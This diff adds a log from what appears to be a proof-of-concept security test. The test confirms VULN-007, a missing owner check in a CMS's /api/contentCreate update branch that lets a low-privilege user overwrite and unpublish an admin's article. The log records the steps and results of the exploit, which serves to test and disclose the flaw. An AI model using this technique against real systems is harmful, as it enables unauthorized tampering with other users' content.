@@ -1,0 +1,8 @@
+[INFO] VULN-007: cross-user content tamper/unpublish via /api/contentCreate update branch
+[SETUP] provision app (authorizedApis=contentCreate) + issue token
+[SETUP] create + publish VICTIM article (owned by admin) and low-priv ATTACKER
+[SETUP] victim content id=7507281192790528000 owner=2 status(pre)=1 ; attacker id=12 (owner!=attacker: yes)
+[STEP] attacker updates victim content via /api/contentCreate (no owner check)
+[INFO] api response: {"result":"success","contentId":"7507281192790528000"}
+[INFO] after attack: title='PWNED_BY_ATTACKER_f3vrft94' status=2 owner=2
+[OK] exploit confirmed — non-owner (id=12) overwrote content owned by id=2 and unpublished it (status 1->2)
